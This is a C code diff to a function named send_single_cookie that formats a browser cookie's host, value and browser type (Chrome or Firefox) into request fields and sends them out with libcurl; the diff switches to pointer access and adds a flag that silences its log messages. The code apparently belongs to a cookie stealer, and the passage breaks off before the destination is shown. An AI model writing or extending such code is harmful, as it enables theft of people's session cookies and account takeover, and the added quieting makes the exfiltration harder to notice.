@@ -3,15 +3,24 @@
 #include <string.h>
 #include <curl/curl.h>
 
+#define CURL_LOG_SHOW
+
 
 /* Will send one cookie pair (host:value).
 */
-uint8_t send_single_cookie(cookies_datatype c_value)
+uint8_t send_single_cookie(cookies_datatype* c_value)
 {
+
+    #ifndef CURL_LOG_SHOW
     printf("[curl] Initialising curl...\n");
+    #endif
+
     CURL* curl;
     curl = curl_easy_init();
+
+    #ifndef CURL_LOG_SHOW
     printf("[curl] Passed. Curl was initialised.\n");
+    #endif
 
     if (!curl)
         return 0;
@@ -20,13 +29,13 @@ uint8_t send_single_cookie(cookies_datatype c_value)
     char q_value[1032];
     char q_btype[16];
 
-    sprintf(q_host, "host=%s", c_value.host);
-    sprintf(q_value, "value=%s&", c_value.value);
+    sprintf(q_host, "host=%s", c_value->host);
+    sprintf(q_value, "value=%s&", c_value->value);
 
-    if (c_value.b_type == 1)
+    if (c_value->b_type == 1)
         strcpy(q_btype, "b_type=google&");
 
-    else if (c_value.b_type == 2)
+    else if (c_value->b_type == 2)
         strcpy(q_btype, "b_type=firefox&");
 
     else
